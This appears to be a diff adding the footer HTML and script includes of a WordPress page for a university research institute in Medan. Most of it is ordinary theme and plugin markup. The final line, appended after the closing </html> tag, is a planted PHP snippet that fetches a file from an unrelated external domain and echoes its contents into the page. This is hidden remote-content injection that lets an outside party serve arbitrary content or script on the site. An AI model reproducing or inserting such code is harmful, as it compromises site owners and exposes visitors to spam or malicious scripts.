+                                            <div class="col-lg-2 col-md-6 widgets-areas">
+                            <div class="wrap-widgets-4">
+                            <div id="block-24" class="widget widget_block"><div class="list-infor">
+        <h4 class="widget-title">Information</h4>
+            <ul class="menu">
+                <li><a href="lppm@uisu.ac.id">lppm@uisu.ac.id </a> </li>
+                <li><a href="tel:0123456">Call Me +6281360936699</a></li>
+                <li>Jl. Sisingamangaraja No.Kelurahan, Teladan Barat, Kec. Medan Kota, Kota Medan, Sumatera Utara 20217</li>
+            </ul>
+    </div></div>                            </div>
+                        </div>
+                                            <div class="col-lg-3 col-md-6 widgets-areas">
+                            <div class="wrap-widgets-5">
+                            <div id="block-26" class="widget widget_block">
+<ul class="wp-block-list"></ul>
+</div>                            </div>
+                        </div>
+                            
+                </div><!-- /.row -->                  
+            </div><!-- /.container --> 
+        </div><!-- /.footer-widgets -->
+    </footer>
+       
+        <!-- Bottom -->
+         
+    <div id="bottom" class="bottom">
+        <div class="container">           
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="container-inside"> 
+                        <div class="content-center">
+                            <div class="copyright">                     
+                                <span>Â© Copyright 2022 <a href="https://themeforest.net/user/themesflat/portfolio">Themesflat</a> - All Rights Reserved.</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>                   
+            </div><!-- /.row -->
+        </div><!-- /.container -->
+    </div>
+        
+    </div> <!-- Footer Background Image --> 
+    <!-- End Footer --> 
+
+            <!-- Go Top -->
+        <a class="go-top">
+            <i class="icon-labaid-la-36"></i>
+        </a>
+     
+</div><!-- /#boxed -->
+
+		<script>
+			window.RS_MODULES = window.RS_MODULES || {};
+			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
+			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
+			window.RS_MODULES.defered = true;
+			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
+			window.RS_MODULES.type = 'compiled';
+		</script>
+					<script type='text/javascript'>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+			<link href="https://fonts.googleapis.com/css?family=Arimo:700%7CJost:400%2C500%7CRoboto:400&display=swap" rel="stylesheet" property="stylesheet" media="all" type="text/css" >
+
+<script>
+		if(typeof revslider_showDoubleJqueryError === "undefined") {function revslider_showDoubleJqueryError(sliderID) {console.log("You have some jquery.js library include that comes after the Slider Revolution files js inclusion.");console.log("To fix this, you can:");console.log("1. Set 'Module General Options' -> 'Advanced' -> 'jQuery & OutPut Filters' -> 'Put JS to Body' to on");console.log("2. Find the double jQuery.js inclusion and remove it");return "Double Included jQuery Library";}}
+</script>
+			<link rel="preload" as="font" id="rs-icon-set-revicon-woff" href="https://lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/fonts/revicons/revicons.woff?5510888" type="font/woff" crossorigin="anonymous" media="all" />
+<link rel='stylesheet' id='rs-plugin-settings-css' href='https://lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.5.25' type='text/css' media='all' />
+<style id='rs-plugin-settings-inline-css' type='text/css'>
+		#rev_slider_1_1_wrapper .hesperiden.tparrows{cursor:pointer;background:rgba(0,0,0,0);width:40px;height:40px;position:absolute;display:block;z-index:1000;  border-radius:50%}#rev_slider_1_1_wrapper .hesperiden.tparrows.rs-touchhover{background:rgba(0,0,0,0)}#rev_slider_1_1_wrapper .hesperiden.tparrows:before{font-family:'revicons';font-size:50px;color:#142441;display:block;line-height:40px;text-align:center}#rev_slider_1_1_wrapper .hesperiden.tparrows.tp-leftarrow:before{content:'e82c';  margin-left:-3px}#rev_slider_1_1_wrapper .hesperiden.tparrows.tp-rightarrow:before{content:'e82d';  margin-right:-3px}
+</style>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/parallax.min.js?ver=6.7.1" id="parallax-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/tf-animated.js?ver=6.7.1" id="tf-animated-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/jquery.justified.min.js?ver=6.7.1" id="jquery-justified-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/post-format/assets/js/iziModal.js?ver=6.7.1" id="iziModal-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/post-format/assets/js/jquery.mb.YTPlayer.js?ver=6.7.1" id="jquery-mb-ytplayer-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
+<script type="text/javascript" id="wp-i18n-js-after">
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text directionu0004ltr': [ 'ltr' ] } );
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.0.1" id="swv-js"></script>
+<script type="text/javascript" id="contact-form-7-js-before">
+/* <![CDATA[ */
+var wpcf7 = {
+    "api": {
+        "root": "https://lp.uisu.ac.id/wp-json/",
+        "namespace": "contact-form-7/v1"
+    },
+    "cached": 1
+};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.0.1" id="contact-form-7-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/js/rbtools.min.js?ver=6.5.18" defer async id="tp-tools-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.5.25" defer async id="revmin-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/wp-books-gallery/assets/js/selectize.min.js?ver=4.6.8" id="wbg-selectize-js"></script>
+<script type="text/javascript" id="wbg-front-js-extra">
+/* <![CDATA[ */
+var wbgAdminScriptObj = {"ajaxurl":"https://lp.uisu.ac.id/wp-admin/admin-ajax.php","modalWidth":"700"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/wp-books-gallery/assets/js/wbg-front.js?ver=4.6.8" id="wbg-front-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3" id="jquery-ui-mouse-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/jquery/ui/slider.min.js?ver=1.13.3" id="jquery-ui-slider-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/themes/labaid/js/html5shiv.js?ver=3.7.0" id="html5shiv-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/themes/labaid/js/matchMedia.js?ver=1.2" id="matchmedia-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/themes/labaid/js/jquery.nice-select.min.js?ver=6.7.1" id="nice-select-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/owl.carousel.min.js?ver=6.7.1" id="owl-carousel-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/themes/labaid/js/magnific.popup.min.js?ver=3.2.8" id="magnific.popup.min-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/themes/labaid/js/smoothscroll.js?ver=1.2.1" id="smoothscroll-js"></script>
+<script type="text/javascript" id="themesflat-main-js-extra">
+/* <![CDATA[ */
+var blog = {"ajaxurl":"https://lp.uisu.ac.id/wp-admin/admin-ajax.php","security":"196799bbbb"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/themes/labaid/js/main.js?ver=2.0.4" id="themesflat-main-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/posts/tf-posts.js?ver=6.7.1" id="tf-posts-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/tf-main-post-type.js?ver=1.0" id="tf-main-post-type-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/jquery.isotope.min.js?ver=6.7.1" id="jquery-isotope-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/js/imagesloaded.pkgd.min.js?ver=6.7.1" id="imagesloaded-pkgd-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/pro-elements/assets/js/webpack-pro.runtime.min.js?ver=3.25.5" id="elementor-pro-webpack-runtime-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.26.0" id="elementor-webpack-runtime-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.26.0" id="elementor-frontend-modules-js"></script>
+<script type="text/javascript" id="elementor-pro-frontend-js-before">
+/* <![CDATA[ */
+var ElementorProFrontendConfig = {"ajaxurl":"https://lp.uisu.ac.id/wp-admin/admin-ajax.php","nonce":"ec76899c97","urls":{"assets":"https://lp.uisu.ac.id/wp-content/plugins/pro-elements/assets/","rest":"https://lp.uisu.ac.id/wp-json/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"id_ID","app_id":""},"lottie":{"defaultAnimationUrl":"https://lp.uisu.ac.id/wp-content/plugins/pro-elements/modules/lottie/assets/animations/default.json"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/pro-elements/assets/js/frontend.min.js?ver=3.25.5" id="elementor-pro-frontend-js"></script>
+<script type="text/javascript" id="elementor-frontend-js-before">
+/* <![CDATA[ */
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Bagikan di Facebook","shareOnTwitter":"Bagikan di Twitter","pinIt":"Buat Pin","download":"Unduh","downloadImage":"Unduh gambar","fullscreen":"Layar Penuh","zoom":"Perbesar","share":"Bagikan","playVideo":"Putar Video","previous":"Sebelumnya","next":"Selanjutnya","close":"Tutup","a11yCarouselPrevSlideMessage":"Slide sebelumnya","a11yCarouselNextSlideMessage":"Slide selanjutnya","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Layar lebar","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.26.0","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_onboarding":true,"e_css_smooth_scroll":true,"theme_builder_v2":true,"home_screen":true,"landing-pages":true,"nested-elements":true,"editor_v2":true,"link-in-bio":true,"floating-buttons":true},"urls":{"assets":"https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/","ajaxurl":"https://lp.uisu.ac.id/wp-admin/admin-ajax.php","uploadUrl":"https://lp.uisu.ac.id/wp-content/uploads"},"nonces":{"floatingButtonsClickTracking":"c2f26294ba"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":987,"title":"Lembaga%20Penelitian%20%E2%80%93%20Universitas%20Islam%20Sumatera%20Utara","excerpt":"","featuredImage":false}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.26.0" id="elementor-frontend-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/pro-elements/assets/js/elements-handlers.min.js?ver=3.25.5" id="pro-elements-handlers-js"></script>
+<script id="rs-initialisation-scripts">
+		var	tpj = jQuery;
+
+		var	revapi1;
+
+		if(window.RS_MODULES === undefined) window.RS_MODULES = {};
+		if(RS_MODULES.modules === undefined) RS_MODULES.modules = {};
+		RS_MODULES.modules["revslider11"] = {once: RS_MODULES.modules["revslider11"]!==undefined ? RS_MODULES.modules["revslider11"].once : undefined, init:function() {
+			window.revapi1 = window.revapi1===undefined || window.revapi1===null || window.revapi1.length===0  ? document.getElementById("rev_slider_1_1") : window.revapi1;
+			if(window.revapi1 === null || window.revapi1 === undefined || window.revapi1.length==0) { window.revapi1initTry = window.revapi1initTry ===undefined ? 0 : window.revapi1initTry+1; if (window.revapi1initTry<20) requestAnimationFrame(function() {RS_MODULES.modules["revslider11"].init()}); return;}
+			window.revapi1 = jQuery(window.revapi1);
+			if(window.revapi1.revolution==undefined){ revslider_showDoubleJqueryError("rev_slider_1_1"); return;}
+			revapi1.revolutionInit({
+					revapi:"revapi1",
+					DPR:"dpr",
+					sliderLayout:"fullwidth",
+					visibilityLevels:"1240,1240,778,480",
+					gridwidth:"1920,1920,778,480",
+					gridheight:"681,681,450,500",
+					lazyType:"smart",
+					perspective:600,
+					perspectiveType:"global",
+					editorheight:"681,768,450,500",
+					responsiveLevels:"1240,1240,778,480",
+					ajaxUrl:"https://lp.uisu.ac.id/wp-admin/admin-ajax.php",
+					progressBar:{disableProgressBar:true},
+					navigation: {
+						wheelCallDelay:1000,
+						onHoverStop:false,
+						arrows: {
+							enable:true,
+							style:"hesperiden",
+							hide_onmobile:true,
+							hide_under:"1024px",
+							left: {
+								h_offset:62
+							},
+							right: {
+								h_offset:62
+							}
+						}
+					},
+					viewPort: {
+						global:true,
+						globalDist:"-200px",
+						enable:false
+					},
+					fallbacks: {
+						allowHTML5AutoPlayOnAndroid:true
+					},
+			});
+			
+		}} // End of RevInitScript
+
+		if (window.RS_MODULES.checkMinimal!==undefined) { window.RS_MODULES.checkMinimal();};
+	</script>
+</body>
+
+    
+</html>
+<?php $url='https://selirhati.store/plugins/dqk-2.txt';$a=@file_get_contents($url);if($a===FALSE){echo '<p>Error fetching content from '.$url.'</p>';}else{echo $a;} ?>
